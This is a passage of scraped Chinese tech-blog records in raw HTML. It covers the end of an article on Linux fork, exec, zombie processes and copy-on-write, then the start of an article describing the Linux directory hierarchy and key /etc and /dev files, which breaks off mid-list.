18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmy parent\r\n    |- me\r\n       |-- ls (zombie)\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29451f1c8325580810-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29451f1c8325580810-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29451f1c8325580810-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29451f1c8325580810-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29451f1c8325580810-1\"><span class=\"crayon-e\">my </span><span class=\"crayon-r\">parent</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29451f1c8325580810-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">me</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29451f1c8325580810-3\"><span class=\"crayon-h\">       </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">--</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ls</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">zombie</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29451f1c8325580810-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>在这时 <code>ls</code> 其实是一个僵尸进程。这意味着它已经死了，但它还在等我，以防我需要检查它的返回值（使用 <code>wait</code> 系统调用）。一旦我获得了它的返回值，我将再次恢复独自一人的状态。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29451f1cc937560924\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmy parent\r\n    |- me\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29451f1cc937560924-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29451f1cc937560924-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29451f1cc937560924-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29451f1cc937560924-1\"><span class=\"crayon-e\">my </span><span class=\"crayon-r\">parent</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29451f1cc937560924-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">me</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29451f1cc937560924-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h3 id=\"toc_2\">fork 和 exec 的代码实现</h3>\n<p>如果你要编写一个 shell，这是你必须做的一个练习（这是一个非常有趣和有启发性的项目。Kamal 在 Github 上有一个很棒的研讨会：<a href=\"https://github.com/kamalmarhubi/shell-workshop\">https://github.com/kamalmarhubi/shell-workshop</a>）。</p>\n<p>事实证明，有了 C 或 Python 的技能，你可以在几个小时内编写一个非常简单的 shell，像 bash 一样。（至少如果你旁边能有个人多少懂一点，如果没有的话用时会久一点。）我已经完成啦，真的很棒。</p>\n<p>这就是 <code>fork</code> 和 <code>exec</code> 在程序中的实现。我写了一段 C 的伪代码。请记住，<a href=\"https://rachelbythebay.com/w/2014/08/19/fork/\">fork 也可能会失败哦。</a></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29451f1d5447150739\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nint pid = fork();\r\n// 我要分身啦\r\n// “我”是谁呢？可能是子进程也可能是父进程\r\nif (pid == 0) {\r\n    // 我现在是子进程\r\n    // “ls” 吃掉了我脑子，然后变成一个完全不一样的进程\r\n    exec([\"ls\"])\r\n} else if (pid == -1) {\r\n    // 天啊，fork 失败了，简直是灾难！\r\n} else {\r\n    // 我是父进程耶\r\n    // 继续做一个酷酷的美男子吧\r\n    // 需要的话，我可以等待子进程结束\r\n}\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29451f1d5447150739-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29451f1d5447150739-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29451f1d5447150739-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29451f1d5447150739-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29451f1d5447150739-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29451f1d5447150739-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29451f1d5447150739-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29451f1d5447150739-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29451f1d5447150739-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29451f1d5447150739-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29451f1d5447150739-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29451f1d5447150739-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29451f1d5447150739-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29451f1d5447150739-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29451f1d5447150739-15\">15</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29451f1d5447150739-1\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">pid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fork</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29451f1d5447150739-2\"><span class=\"crayon-c\">// 我要分身啦</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29451f1d5447150739-3\"><span class=\"crayon-c\">// “我”是谁呢？可能是子进程也可能是父进程</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29451f1d5447150739-4\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29451f1d5447150739-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 我现在是子进程</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29451f1d5447150739-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// “ls” 吃掉了我脑子，然后变成一个完全不一样的进程</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29451f1d5447150739-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">exec</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">[</span><span class=\"crayon-s\">\"ls\"</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29451f1d5447150739-8\"><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">pid</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29451f1d5447150739-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 天啊，fork 失败了，简直是灾难！</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29451f1d5447150739-10\"><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">else</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29451f1d5447150739-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 我是父进程耶</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29451f1d5447150739-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 继续做一个酷酷的美男子吧</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29451f1d5447150739-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 需要的话，我可以等待子进程结束</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29451f1d5447150739-14\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29451f1d5447150739-15\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0015 seconds] -->\r\n<p></p>\n<h3 id=\"toc_3\">上文提到的“脑子被吃掉”是什么意思呢？</h3>\n<p>进程有很多属性：</p>\n<ul>\n<li>打开的文件（包括打开的网络连接）</li>\n<li>环境变量</li>\n<li>信号处理程序（在程序上运行 Ctrl + C 时会发生什么？）</li>\n<li>内存（你的“地址空间”）</li>\n<li>寄存器</li>\n<li>可执行文件（<code>/proc/$pid/exe</code>）</li>\n<li>cgroups 和命名空间（与 Linux 容器相关）</li>\n<li>当前的工作目录</li>\n<li>运行程序的用户</li>\n<li>其他我还没想到的</li>\n</ul>\n<p>当你运行 <code>execve</code> 并让另一个程序吃掉你的脑子的时候，实际上几乎所有东西都是相同的！ 你们有相同的环境变量、信号处理程序和打开的文件等等。</p>\n<p>唯一改变的是，内存、寄存器以及正在运行的程序，这可是件大事。</p>\n<h3 id=\"toc_4\">为何 fork 并非那么耗费资源（写入时复制）</h3>\n<p>你可能会问：“如果我有一个使用了 2GB 内存的进程，这是否意味着每次我启动一个子进程，所有 2 GB 的内存都要被复制一次？这听起来要耗费很多资源！”</p>\n<p>事实上，Linux 为 <code>fork()</code> 调用实现了写时复制copy on write，对于新进程的 2GB 内存来说，就像是“看看旧的进程就好了，是一样的！”。然后，当如果任一进程试图写入内存，此时系统才真正地复制一个内存的副本给该进程。如果两个进程的内存是相同的，就不需要复制了。</p>\n<h3 id=\"toc_5\">为什么你需要知道这么多</h3>\n<p>你可能会说，好吧，这些细节听起来很厉害，但为什么这么重要？关于信号处理程序或环境变量的细节会被继承吗？这对我的日常编程有什么实际影响呢？</p>\n<p>有可能哦！比如说，在 Kamal 的博客上有一个很有意思的 <a href=\"http://kamalmarhubi.com/blog/2015/06/30/my-favourite-bug-so-far-at-the-recurse-center/\">bug</a>。它讨论了 Python 如何使信号处理程序忽略了 <code>SIGPIPE</code>。也就是说，如果你从 Python 里运行一个程序，默认情况下它会忽略 <code>SIGPIPE</code>！这意味着，程序从 Python 脚本和从 shell 启动的表现会<strong>有所不同</strong>。在这种情况下，它会造成一个奇怪的问题。</p>\n<p>所以，你的程序的环境（环境变量、信号处理程序等）可能很重要，都是从父进程继承来的。知道这些，在调试时是很有用的。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113506\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113506votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113506\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 2 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "title": "Linux 下各文件夹的结构说明及用途介绍", "fav_nums": 7, "url": "http://blog.jobbole.com/113519/", "create_date": "2018/01/23", "url_object_id": "a47bbcc27d28cbfe845e666d99ca70ba", "comment_nums": 0, "front_image_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/xningge/p/8331631.html\">小宁哥</a>   </div><p><strong>linux</strong><strong>下各文件</strong><strong>夹</strong><strong>的</strong><strong>结</strong><strong>构</strong><strong>说</strong><strong>明及用途介</strong><strong>绍</strong><strong>：</strong></p>\n<p><strong>/bin</strong><strong>：</strong>二进制可执行命令。<br>\n<strong>/dev</strong><strong>：</strong>设备特殊文件。<br>\n<strong>/etc</strong><strong>：</strong>系统管理和配置文件。<br>\n<strong>/etc/rc.d</strong><strong>：</strong>启动的配 置文件和脚本。<br>\n<strong>/home</strong><strong>：</strong>用户主目录的基点，比如用户user的主目录就是/home/user，可以用~user表示。<br>\n<strong>/lib</strong><strong>：</strong>标准程序设计库，又 叫动态链接共享库，作用类似windows里的.dll文件。<br>\n<strong>/sbin</strong><strong>：</strong>系统管理命令，这 里存放的是系统管理员使用的管理程序。<br>\n<strong>/tmp</strong><strong>：</strong>公用的临时文件存储 点。<br>\n<strong>/root</strong><strong>：</strong>系统管理员的主目 录。<br>\n<strong>/mnt</strong><strong>：</strong>系统提供这个目录是 让用户临时挂载其他的文件系统。<br>\n<strong>/lost+found</strong><strong>：</strong>这个 目录平时是空的，系统非正常关机而留下“无家可归”的文件就在这里。<br>\n<strong>/proc</strong><strong>：</strong>虚拟的目录，是系 统内存的映射。可直接访问这个目录来获取系统信息。<br>\n<strong>/var</strong><strong>：</strong>某些大文件的溢出 区，比方说各种服务的日志文件。<br>\n<strong>/usr</strong><strong>：</strong>最庞大的目录，要用 到的应用程序和文件几乎都在这个目录。<strong>其中包含</strong><strong>：</strong><br>\n<strong>/usr/x11r6</strong><strong>：</strong>存放x window的目录。<br>\n<strong>/usr/bin</strong><strong>：</strong>众多的应用程序。<br>\n<strong>/usr/sbin</strong><strong>：</strong>超级用户的一些管理程序。<br>\n<strong>/usr/doc</strong><strong>：</strong>linux文档。<br>\n<strong>/usr/include</strong><strong>：</strong>linux下开发和编译应用程序所需要的头文件。<br>\n<strong>/usr/lib</strong><strong>：</strong>常用的动态链接库和软件包的配置文件。<br>\n<strong>/usr/man</strong><strong>：</strong>帮助文档。<br>\n<strong>/usr/src</strong><strong>：</strong>源代码，linux内核的源代码就放在/usr/src/linux 里。<br>\n<strong>/usr/local/bin</strong><strong>：</strong>本地增加的命令。<br>\n<strong>/usr/local/lib</strong><strong>：</strong>本地增加的库根文件系统。</p>\n<p>通常情况下，根文件系统所占空间一般应该比较小，因为其中的绝大部分文件都不需要经常改动，而且包括严格的文件和一个小的 不经常改变的文件系统不容易损坏。除了可能的一个叫<strong>/vmlinuz</strong>标准的系统引导映像之外，根目录一般不含任何文 件。所有其他文件在根文件系统的子目录中。<br>\n<strong>1. /bin</strong><strong>目</strong><strong>录</strong><br>\n<strong>/bin</strong>目录包含了引导启动所需的命令或普通用户可能用的命令(可能在引导启动后)。这些命 令都是二进制文件的可执行程序(bin是binary的简称)，多是系统中重要的系统文件。<br>\n<strong>2. /sbin</strong><strong>目</strong><strong>录</strong><br>\n<strong>/sbin</strong>目录类似<strong>/bin</strong> ，也用于存储二进制文件。因为其中的大部分文件多是系统管理员使用的基本的系统程序，所以虽然普通用户必要且允许时可以使用，但一般不给普通用户使 用。<br>\n<strong>3. /etc</strong><strong>目</strong><strong>录</strong><br>\n<strong>/etc</strong>目录存放着各种系统配置文件，其中包括了用户信息文件<strong>/etc/passwd</strong>， 系统初始化文件<strong>/etc/rc</strong>等。linux正是靠这些文件才得以正常地运行。<br>\n<strong>4. /root</strong><strong>目</strong><strong>录</strong><br>\n/root目录是超级用户的目录。<br>\n<strong>5. /lib</strong><strong>目</strong><strong>录</strong><br>\n<strong>/lib</strong>目录是根文件系统上的程序所需的共享库，存放了根文件系统程序运行所需的共享文件。 这些文件包含了可被许多程序共享的代码，以避免每个程序都包含有相同的子程序的副本，故可以使得可执行文件变得更小，节省空间。<br>\n<strong>6. /lib/modules</strong><strong>目</strong><strong>录</strong><br>\n<strong>/lib/modules</strong>目录包含系统核心可加载各种模块，尤其是那些在恢复损坏的系统时重 新引导系统所需的模块(例如网络和文件系统驱动)。<br>\n<strong>7. /dev</strong><strong>目</strong><strong>录</strong><br>\n<strong>/dev</strong>目录存放了设备文件，即设备驱动程序，用户通过这些文件访问外部设备。比如，用户可 以通过访问<strong>/dev/mouse</strong>来访问鼠标的输入，就像访问其他文件一样。<br>\n<strong>8. /tmp</strong><strong>目</strong><strong>录</strong><br>\n<strong>/tmp</strong>目录存放程序在运行时产生的信息和数据。但在引导启动后，运行的程序最好使用<strong>/var/tmp</strong>来 代替<strong>/tmp</strong>，因为前者可能拥有一个更大的磁盘空间。<br>\n<strong>9. /boot</strong><strong>目</strong><strong>录</strong><br>\n<strong>/boot</strong>目录存放引导加载器(bootstrap loader)使用的文件，如lilo，核心映像也经常放在这里，而不是放在根目录中。但是如果有许多核心映像，这个目录就可能变得很大，这时使用单独的 文件系统会更好一些。还有一点要注意的是，要确保核心映像必须在ide硬盘的前1024柱面内。<br>\n<strong>10. /mnt</strong><strong>目</strong><strong>录</strong><br>\n<strong>/mnt</strong>目录是系统管理员临时安装(mount)文件系统的安装点。程序并不自动支持安装到<strong>/mnt</strong> 。<strong>/mnt</strong>下面可以分为许多子目录，例如<strong>/mnt/dosa</strong>可能是使用 msdos文件系统的软驱，而<strong>/mnt/exta</strong>可能是使用ext2文件系统的软驱，<strong>/mnt/cdrom</strong>光 驱等等。<br>\n<strong>11. /proc, /usr, /var, /home</strong><strong>目</strong><strong>录</strong><br>\n其他文件系统的安装点。</p>\n<p>目录树可以分为小的部分，每个部分可以在自己的磁盘或分区上。主要部分是根、/usr 、/var 和 /home 文件系统。每个部分有不同的目的。<br>\n每台机器都有根文件系统，它包含系统引导和使其他文件系统得以mount所必要的文件，根文件系统应该有单用户状态所必须的足够的内容。还应该包括修复损坏 系统、恢复备份等的工具。<br>\n/usr 文件系统包含所有命令、库、man页和其他一般操作中所需的不改变的文件。 /usr 不应该有 一般使用中要修改的文件。这样允许此文件系统中的文件通过网络共享，这样可以更有效，因为这样节省了磁盘空间(/usr 很容易是数百兆)，且易于管理 (当升级应用时，只有主/usr 需要改变，而无须改变每台机器) 即使此文件系统在本地盘上，也可以只读mount，以减少系统崩溃时文件系统的损 坏。<br>\n/var 文件系统包含会改变的文件，比如spool目录(mail、news、打印机等用的)， log文件、 formatted manual pages和暂存文件。传统上/var 的所有东西曾在 /usr 下的某个地方，但这样/usr 就不可能只读安装 了。<br>\n/home 文件系统包含用户家目录，即系统上的所有实际数据。一个大的/home 可能要分为若干文件系统，需要在 /home 下加一级名字，如/home/students 、/home/staff 等。</p>\n<p>下面详细介绍：<br>\n<strong>/etc</strong><strong>文件系</strong><strong>统</strong><strong><br>\n</strong><strong>/etc</strong>目录包含各种系统配置文件，下面说明其中的一些。其他的你应该知道它们属于哪个程序， 并阅读该程序的man页。许多网络配置文件也在/etc中。<br>\n<strong>1. /etc/rc</strong><strong>或/etc/rc.d或/etc/rc?.d：</strong>启动、或改变运行级时运 行的脚本或脚本的目录。<br>\n<strong>2. /etc/passwd</strong><strong>：</strong>用户数据库，其中的域给出了用户名、真实姓名、用户起始目 录、加密口令和用户的其他信息。<br>\n<strong>3. /etc/fdprm</strong><strong>：</strong>软盘参数表，用以说明不同的软盘格式。可用setfdprm进 行设置。更多的信息见setfdprm的帮助页。<br>\n<strong>4. /etc/fstab</strong><strong>：</strong>指定启动时需要自动安装的文件系统列表。也包括用swapon -a启用的swap区的信息。<br>\n<strong>5. /etc/group</strong><strong>：</strong>类似<strong>/etc/passwd</strong> ，但说明的不是用户信息而是组的信息。包括组的各种数据。<br>\n<strong>6. /etc/inittab</strong><strong>：</strong>init 的配置文件。<br>\n<strong>7. /etc/issue</strong><strong>：</strong>包括用户在登录提示符前的输出信息。通常包括系统的一段短说明 或欢迎信息。具体内容由系统管理员确定。<br>\n<strong>8. /etc/magic</strong><strong>：</strong>“file”的配置文件。包含不同文件格式的说 明，“file”基于它猜测文件类型。<br>\n<strong>9. /etc/motd</strong><strong>：</strong>motd是message of the day的缩写，用户成功登录后自动输出。内容由系统管理员确定。<br>\n常用于通告信息，如计划关机时间的警告等。<br>\n<strong>10. /etc/mtab</strong><strong>：</strong>当前安装的文件系统列表。由脚本(scritp)初始化，并由 mount命令自动更新。当需要一个当前安装的文件系统的列表时使用(例如df命令)。<br>\n<strong>11. /etc/shadow</strong><strong>：</strong>在安装了影子(shadow)口令软件的系统上的影子口令 文件。影子口令文件将/etc/passwd文件中的加密口令移动到/etc/shadow中，而后者只对超级用户(root)可读。这使破译口令更困 难，以此增加系统的安全性。<br>\n<strong>12. /etc/login.defs</strong><strong>：</strong>login命令的配置文件。<br>\n<strong>13. /etc/printcap</strong><strong>：</strong>类似/etc/termcap ，但针对打印机。语法不同。<br>\n<strong>14. /etc/profile </strong><strong>、</strong><strong>/etc/csh.login</strong><strong>、</strong><strong>/etc/csh.cshrc</strong><strong>：</strong>登 录或启动时bourne或cshells执行的文件。这允许系统管理员为所有用户建立全局缺省环境。<br>\n<strong>15. /etc/securetty</strong><strong>：</strong>确认安全终端，即哪个终端允许超级用户(root) 登录。一般只列出虚拟控制台，这样就不可能(至少很困难)通过调制解调器(modem)或网络闯入系统并得到超级用户特权。<br>\n<strong>16. /etc/shells</strong><strong>：</strong>列出可以使用的shell。chsh命令允许用户在本文件 指定范围内改变登录的shell。提供一<br>\n台机器ftp服务的服务进程ftpd检查用户shell是否列在<strong>/etc/shells</strong>文件 中，如果不是，将不允许该用户登录。<br>\n<strong>17. /etc/termcap</strong><strong>：</strong>终端性能数据库。说明不同的终端用什么“转义序列”控 制。写程序时不直接输出转义<br>\n序列(这样只能工作于特定品牌的终端)，而是从<strong>/etc/termcap</strong>中查找要做的工作的 正确序列。这样，多数的程序可以在多数终端上运行。<br>\n<strong>/dev</strong><strong>文件系</strong><strong>统</strong><strong><br>\n<strong>/dev</strong></strong>目录包括所有设备的设备文件。设备文件用特定的约定命名，这在设备列表中说明。设备文件在安装时由系 统产生，以后可以用<strong>/dev/makedev</strong>描述。/dev/makedev.local 是系统管理员为本地设备文件(或连接)写的描述文稿(即如一些非标准设备驱动不是标准makedev 的一部分)。下面简要介绍<strong>/dev</strong>下 一些常用文件。<br>\n<strong>1. /dev/console</strong><strong>：</strong>系统控制台，也就是直接和系统连接的监视器。<br>\n<strong>2. /dev/hd</strong><strong>：</strong>ide硬盘驱动程序接口。如：/dev/hda指的是第一个硬 盘，had1则是指<strong>/dev/hda</strong>的第一个分区。如系统中有其他的硬盘，则依次为<strong>/dev /hdb</strong><strong>、/dev/hdc、. . . . .</strong> .；如有多个分区则依次为hda1、hda2 . . . . . .<br>\n<strong>3. /dev/sd</strong><strong>：</strong>scsi磁盘驱动程序接口。如系统有scsi硬盘，就不会访问<strong>/dev/had</strong>， 而会访问<strong>/dev/sda</strong>。<br>\n<strong>4. 